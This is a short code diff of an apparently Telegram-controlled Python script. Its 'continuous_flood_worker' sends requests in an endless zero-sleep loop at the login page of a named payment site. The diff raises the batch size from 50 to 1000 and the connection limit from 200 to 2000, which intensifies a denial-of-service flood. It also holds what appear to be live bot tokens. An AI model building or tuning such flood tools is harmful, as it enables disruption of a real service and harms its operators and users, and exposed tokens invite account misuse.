@@ -5,7 +5,7 @@ from telebot.async_telebot import AsyncTeleBot
 # ==========================================
 # CONFIGURATION
 # ==========================================
-BOT_TOKEN = "8643292970:AAEW9cE9Qsm4zLdvyO1xEFWvhKdFBFhex68"  # Apna bot token yahan dalein
+BOT_TOKEN = "8607797493:AAEUFBnLIlB-UFvmsb3mMXSP1dtFFGPOGww"  # Apna bot token yahan dalein
 TARGET_URL = "https://www.elitepay.co.in/login"
 
 bot = AsyncTeleBot(BOT_TOKEN)
@@ -44,8 +44,8 @@ async def fire_request(session):
 
 # High-Speed Infinite Loop (Zero Sleep)
 async def continuous_flood_worker():
-    batch_size = 50
-    connector = aiohttp.TCPConnector(limit=200, limit_per_host=200)
+    batch_size = 1000
+    connector = aiohttp.TCPConnector(limit=2000, limit_per_host=200)
     
     async with aiohttp.ClientSession(connector=connector) as session:
         while True:
